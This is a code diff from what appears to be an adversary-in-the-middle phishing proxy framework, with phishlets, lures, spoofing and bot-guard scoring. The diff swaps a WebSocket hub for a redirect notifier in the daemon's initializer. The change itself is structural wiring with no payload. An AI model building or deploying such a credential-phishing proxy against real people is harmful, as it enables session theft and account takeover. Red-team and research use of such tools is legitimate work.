@@ -21,6 +21,7 @@ import (
 	"github.com/travisbale/mirage/internal/phishlet"
 	"github.com/travisbale/mirage/internal/proxy"
 	"github.com/travisbale/mirage/internal/puppet"
+	"github.com/travisbale/mirage/internal/redirect"
 	"github.com/travisbale/mirage/internal/spoof"
 	"github.com/travisbale/mirage/internal/store/sqlite"
 )
@@ -74,7 +75,7 @@ type initializer struct {
 	blacklistSvc  *aitm.BlacklistService
 	puppetSvc     *aitm.PuppetService
 	spoofer       *spoof.Server
-	wsHub         *proxy.WSHub
+	notifier      *redirect.Notifier
 }
 
 // New constructs and fully wires a Daemon. Returns an error if any
@@ -238,7 +239,7 @@ func (ini *initializer) initServices() error {
 	ini.phishletSvc = phishletSvc
 
 	ini.lureSvc = &aitm.LureService{Store: ini.lureStore, Invalidator: phishletSvc, Cipher: aesgcm.Cipher{}}
-	ini.wsHub = proxy.NewWSHub(ini.bus, ini.sessionSvc, ini.lureSvc, ini.logger)
+	ini.notifier = redirect.NewNotifier(ini.bus, ini.sessionSvc, ini.lureSvc, ini.logger)
 
 	ini.puppetSvc = ini.initPuppet()
 	ini.Daemon.puppetSvc = ini.puppetSvc
@@ -308,7 +309,7 @@ func (ini *initializer) initProxy(version string) error {
 		PuppetSvc:      ini.puppetSvc,
 		TelemetryScore: ini.botGuardSvc,
 		Obfuscator:     ini.obfuscator,
-		WSHub:          ini.wsHub,
+		Notifier:       ini.notifier,
 		APIHandler:     apiHandler,
 		Logger:         ini.logger,
 		ScoreThreshold: 0.6,
